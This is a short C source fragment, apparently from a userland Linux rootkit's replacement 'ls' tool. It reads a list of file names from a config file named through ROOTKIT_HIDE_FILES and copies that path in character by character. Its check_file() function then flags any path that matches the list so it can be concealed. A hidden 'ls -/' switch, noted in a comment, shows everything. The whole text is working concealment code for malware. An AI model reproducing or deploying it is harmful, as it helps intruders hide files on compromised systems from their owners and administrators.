#define STR_SIZE	128
#define SHOWFLAG	/*  Able to list files with 'ls -/' command  */

struct h_st {
	struct h_st *next;
	char filename[STR_SIZE];
};

struct h_st *hack_list;
struct h_st *h_tmp;

char tmp_str[STR_SIZE];

FILE *fp_hack;
int showall=0;
 
inline file_block_list()
{
	char LSCONF[10];

	LSCONF[0]=ROOTKIT_HIDE_FILES[0];
	LSCONF[1]=ROOTKIT_HIDE_FILES[1];
	LSCONF[2]=ROOTKIT_HIDE_FILES[2];
	LSCONF[3]=ROOTKIT_HIDE_FILES[3];
	LSCONF[4]=ROOTKIT_HIDE_FILES[4];
	LSCONF[5]=ROOTKIT_HIDE_FILES[5];
	LSCONF[6]=ROOTKIT_HIDE_FILES[6];
	LSCONF[7]=ROOTKIT_HIDE_FILES[7];
	LSCONF[8]=ROOTKIT_HIDE_FILES[8];
	LSCONF[9]='\0';

	h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
	hack_list=h_tmp;

	if(fp_hack=fopen(LSCONF, "r")) {
		while(fgets(tmp_str, 126, fp_hack)) {
			h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
			strcpy(h_tmp->filename, tmp_str);
			h_tmp->filename[strlen(h_tmp->filename)-1]='\0';
			h_tmp=h_tmp->next;
		}
	}

	h_tmp->next=NULL;
}

inline int check_file(char *fpath)
{ 

	for(h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
		if(strstr(fpath, h_tmp->filename))
			return(1);

	return(0);
}   
